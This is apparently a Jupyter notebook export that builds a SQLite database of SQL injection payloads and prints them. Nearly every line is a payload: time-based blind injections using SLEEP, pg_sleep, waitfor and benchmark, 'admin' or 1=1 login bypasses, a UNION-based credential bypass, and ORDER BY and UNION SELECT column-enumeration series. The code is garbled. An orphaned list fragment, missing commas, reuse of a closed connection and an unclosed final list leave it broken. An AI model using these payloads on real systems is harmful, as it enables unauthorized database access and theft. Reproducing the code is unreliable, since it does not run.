#!/usr/bin/env python
# coding: utf-8

# In[20]:


import sqlite3

# Connect to the SQLite database (creates a new database if it doesn't exist)
conn = sqlite3.connect('payloads.db')

# Create a cursor object to execute SQL commands
cursor = conn.cursor()

# Create a table to store payloads
cursor.execute('''CREATE TABLE IF NOT EXISTS sql_injection_payloads (
                    id INTEGER PRIMARY KEY,
                    payload TEXT
                  )''')

# Define your payloads
payloads = [
    '\'',
    '\'\'',
    '`',
    'RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND \'Txws\'=\'',
    'RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND \'Txws\'=\'',
    'IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--',
    'IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--',
    '%\' AND 8310=8310 AND \'%\'=\'',
    '%\' AND 8310=8311 AND \'%\'=\'',
    'and (select substring(@@version,1,1))=\'X\'',
    'and (select substring(@@version,1,1))=\'M\'',
    'and (select substring(@@version,2,1))=\'i\'',
    'and (select substring(@@version,2,1))=\'y\'',
    'and (select substring(@@version,3,1))=\'c\'',
    'and (select substring(@@version,3,1))=\'S\'',
    'and (select substring(@@version,3,1))=\'X\'',
]

# Insert the payloads into the table
for payload in payloads:
    cursor.execute("INSERT INTO sql_injection_payloads (payload) VALUES (?)", (payload,))

# Commit the changes
conn.commit()

# Close the connection
conn.close()

import sqlite3

# Connect to the SQLite database
conn = sqlite3.connect('payloads.db')

# Create a cursor object to execute SQL commands
cursor = conn.cursor()

# Execute a SELECT query to retrieve the payloads
cursor.execute("SELECT * FROM sql_injection_payloads")

# Fetch all the rows returned by the query
payloads = cursor.fetchall()

# Print the payloads
for payload in payloads:
    print(payload[1])  # Assuming payload is stored in the second column

# Close the connection
conn.close()


# In[23]:


for payload in payloads:
    cursor.execute("INSERT INTO sql_injection_payloads (payload) VALUES (?)", (payload,))

# Commit the changes
conn.commit()

# Close the connection
conn.close()

import sqlite3

# Connect to the SQLite database
conn = sqlite3.connect('payloads.db')

# Create a cursor object to execute SQL commands
cursor = conn.cursor()

# Execute a SELECT query to retrieve the payloads
cursor.execute("SELECT * FROM sql_injection_payloads")

# Fetch all the rows returned by the query
payloads = cursor.fetchall()

# Print the payloads
for payload in payloads:
    print(payload[1])  # Assuming payload is stored in the second column

# Close the connection
conn.close()
    '# from wapiti',
    'sleep(5)#',
    '" or sleep(5)#',
    '\' or sleep(5)#',
    '" or sleep(5)="',
    '\' or sleep(5)=\'',
    '1) or sleep(5)#',
    '") or sleep(5)="',
    '\') or sleep(5)=\'',
    '1)) or sleep(5)#',
    '")) or sleep(5)="',
    '\')) or sleep(5)=\'',
    ');waitfor delay \'0:0:5\'--',
    '\';waitfor delay \'0:0:5\'--',
    '";waitfor delay \'0:0:5\'--',
    '\');waitfor delay \'0:0:5\'--',
    '")));waitfor delay \'0:0:5\'--',
    'benchmark(10000000,MD5(1))#',
    '1 or benchmark(10000000,MD5(1))#',
    '" or benchmark(10000000,MD5(1))#',
    '\' or benchmark(10000000,MD5(1))#',
    '1) or benchmark(10000000,MD5(1))#',
    '") or benchmark(10000000,MD5(1))#',
    '\') or benchmark(10000000,MD5(1))#',
    '1)) or benchmark(10000000,MD5(1))#',
    '")) or benchmark(10000000,MD5(1))#',
    '\')) or benchmark(10000000,MD5(1))#',
    'pg_sleep(5)--',
    '1 or pg_sleep(5)--',
    '" or pg_sleep(5)--',
    '\' or pg_sleep(5)--',
    '1) or pg_sleep(5)--',
    '") or pg_sleep(5)--',
    '\') or pg_sleep(5)--',
    '1)) or pg_sleep(5)--',
    '")) or pg_sleep(5)--',
    '\')) or pg_sleep(5)--',
    'AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND \'vRxe\'=\'vRxe',
    'AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND \'%\'=\'',
    'AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)',
    'AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--',
    'AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#',
    'SLEEP(5)#',
    'SLEEP(5)--',
    'SLEEP(5)="',
    'SLEEP(5)=\'',
    'or SLEEP(5)',
    'or SLEEP(5)#',
    'or SLEEP(5)--',
    'or SLEEP(5)="',
    'or SLEEP(5)=\'',
    'waitfor delay \'00:00:05\'',
    'waitfor delay \'00:00:05\'--',
    'waitfor delay \'00:00:05\'#',
    'benchmark(50000000,MD5(1))',
    'benchmark(50000000,MD5(1))--',
    'benchmark(50000000,MD5(1))#',
    'or benchmark(50000000,MD5(1))',
    'or benchmark(50000000,MD5(1))--',
    'or benchmark(50000000,MD5(1))#',
    'pg_SLEEP(5)',
    'pg_SLEEP(5)--',
    'pg_SLEEP(5)#',
    'or pg_SLEEP(5)',
    'or pg_SLEEP(5)--',
    'or pg_SLEEP(5)#',
    '\'\"',
    'AnD SLEEP(5)',
    'AnD SLEEP(5)--',
    'AnD SLEEP(5)#',
    '&&SLEEP(5)',
    '&&SLEEP(5)--',
    '&&SLEEP(5)#',
    '\' AnD SLEEP(5) ANd \'1',
    '\'&&SLEEP(5)&&\'1',
    'ORDER BY SLEEP(5)',
    'ORDER BY SLEEP(5)--',
    'ORDER BY SLEEP(5)#',
    '(SELECT * FROM (SELECT(SLEEP(5)))ecMj)',
    '(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#',
    '(SELECT * FROM (SELECT)',
]
for payload in payloads:
    cursor.execute("INSERT INTO sql_injection_payloads (payload) VALUES (?)", (payload,))

# Commit the changes
conn.commit()

# Close the connection
conn.close()

import sqlite3

# Connect to the SQLite database
conn = sqlite3.connect('payloads.db')

# Create a cursor object to execute SQL commands
cursor = conn.cursor()

# Execute a SELECT query to retrieve the payloads
cursor.execute("SELECT * FROM sql_injection_payloads")

# Fetch all the rows returned by the query
payloads = cursor.fetchall()

# Print the payloads
for payload in payloads:
    print(payload[1])  # Assuming payload is stored in the second column

# Close the connection
conn.close()


# In[24]:


import sqlite3

# Connect to the SQLite database (creates a new database if it doesn't exist)
conn = sqlite3.connect('payloads.db')

# Create a cursor object to execute SQL commands
cursor = conn.cursor()

# Create a table to store payloads
cursor.execute('''CREATE TABLE IF NOT EXISTS sql_injection_payloads (
                   id INTEGER PRIMARY KEY,
                   payload TEXT
                 )''')

# Define your payloads
payloads = [
   "'-'",
   "' '",
   "'&'",
   "'^'",
   "'*'",
   "'-'",
   "' '",
   "'&'",
   "'^'",
   "'*'",
   '"-"',
   '" "',
   '"&"',
   '"^"',
   '"*"',
   '" or \'-\'"',
   '" or \' \'"',
   '" or \'&\'"',
   '" or \'^\'"',
   '" or \'*\'"',
   '"-"',
   '" "',
   '"&"',
   '"^"',
   '"*"',
   '" or true--"',
   '" or \'x\'=\'x"',
   '" or (\'x\')=(\'x"',
   '" or ((\'x\'))=((\'x"',
   '" or "x"="x"',
   '" or ("x")=("x"',
   '" or (("x"))=(("x"',
   '"or 1=1"',
   '"or 1=1--"',
   '"or 1=1#"',
   '"or 1=1/*"',
   '"admin\' --"',
   '"admin\' #"',
   '"admin\'/*"',
   '"admin\' or \'1\'=\'1"',
   '"admin\' or \'1\'=\'1\'--"',
   '"admin\' or \'1\'=\'1\'#"',
   '"admin\' or \'1\'=\'1\'/*"',
   '"admin\'or 1=1 or \'\'=\'"',
   '"admin\' or 1=1"',
   '"admin\' or 1=1--"',
   '"admin\' or 1=1#"',
   '"admin\' or 1=1/*"',
   '"admin\') or (\'1\'=\'1"',
   '"admin\') or (\'1\'=\'1\'--"',
   '"admin\') or (\'1\'=\'1\'#"',
   '"admin\') or (\'1\'=\'1\'/*"',
   '"admin\') or \'1\'=\'1"',
   '"admin\') or \'1\'=\'1\'--"',
   '"admin\') or \'1\'=\'1\'#"',
   '"admin\') or \'1\'=\'1\'/*"',
   '"admin" --"',
   '"admin" #"',
   '"admin"/*"',
   '"admin" or "1"="1"',
   '"admin" or "1"="1"--"',
   '"admin" or "1"="1"#"',
   '"admin" or "1"="1"/*"',
   '"admin"or 1=1 or ""=""',
   '"admin" or 1=1"',
   '"admin" or 1=1--"',
   '"admin" or 1=1#"',
   '"admin" or 1=1/*"',
   '"admin") or ("1"="1"',
   '"admin") or ("1"="1" --"',
   '"admin") or ("1"="1"#"',
   '"admin") or ("1"="1"/*"',
   '"admin") or "1"="1"',
   '"admin") or "1"="1" --"',
   '"admin") or "1"="1"#"',
   '"admin") or "1"="1"/*"',
   '"1234 \' AND 1=0 UNION ALL SELECT \'admin\', \'81dc9bdb52d04dc20036dbd8313ed055\'"',
   '"1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055"'
]

# Insert the payloads into the table
for payload in payloads:
   cursor.execute("INSERT INTO sql_injection_payloads (payload) VALUES (?)", (payload,))

# Commit the changes
conn.commit()

# Close the connection
conn.close()

import sqlite3

# Connect to the SQLite database
conn = sqlite3.connect('payloads.db')

# Create a cursor object to execute SQL commands
cursor = conn.cursor()

# Execute a SELECT query to retrieve the payloads
cursor.execute("SELECT * FROM sql_injection_payloads")

# Fetch all the rows returned by the query
payloads = cursor.fetchall()

# Print the payloads
for payload in payloads:
   print(payload[1])  # Assuming payload is stored in the second column

# Close the connection
conn.close()


# In[7]:


import sqlite3

# Connect to the SQLite database (creates a new database if it doesn't exist)
conn = sqlite3.connect('payloads.db')

# Create a cursor object to execute SQL commands
cursor = conn.cursor()

# Create a table to store payloads
cursor.execute('''CREATE TABLE IF NOT EXISTS sql_injection_payloads (
                   id INTEGER PRIMARY KEY,
                   payload TEXT
                 )''')

# Define your payloads
payloads = [
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30",
"ORDER BY SLEEP(5)#"
"ORDER BY 1,SLEEP(5)#",
"ORDER BY 1,SLEEP(5),3#",
"ORDER BY 1,SLEEP(5),3,4#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#"
"ORDER BY 1,SLEEP(5)#",
"ORDER BY 1,SLEEP(5),3#",
"ORDER BY 1,SLEEP(5),3,4#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#"
"ORDER BY SLEEP(5)--",
"ORDER BY 1,SLEEP(5)--",
"ORDER BY 1,SLEEP(5),3--",
"ORDER BY 1,SLEEP(5),3,4--",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5--",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6--",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7--",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8--",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9--",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10--",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11--",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12--",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13--",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14--",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14--",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15--",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16--",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17--",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--",
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--"
"UNION ALL SELECT 1,2",
"UNION ALL SELECT 1,2,3",
"UNION ALL SELECT 1,2,3,4",
"UNION ALL SELECT 1,2,3,4,5",
"UNION ALL SELECT 1,2,3,4,5,6",
"UNION ALL SELECT 1,2,3,4,5,6,7",
"UNION ALL SELECT 1,2,3,4,5,6,7,8",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30",
"UNION ALL SELECT 1#",
"UNION ALL SELECT 1,2#",
"UNION ALL SELECT 1,2,3#",
"UNION ALL SELECT 1,2,3,4#",
"UNION ALL SELECT 1,2,3,4,5#",
"UNION ALL SELECT 1,2,3,4,5,6#",
"UNION ALL SELECT 1,2,3,4,5,6,7#",
"UNION ALL SELECT 1,2,3,4,5,6,7,8#",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9#",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10#",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11#",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12#",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13#",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15#",
"UNION ALL SELECT 1,2,3,4,5,6",
"UNION ALL SELECT 1,2,3,4,5,6,7--",
"UNION ALL SELECT 1,2,3,4,5,6,7,8--",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9--",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10--",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11--",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12--",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13--",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14--",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--",
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--",
"UNION SELECT @@VERSION,SLEEP(5),3",
"UNION SELECT @@VERSION,SLEEP(5),USER(),4",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11",
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12",
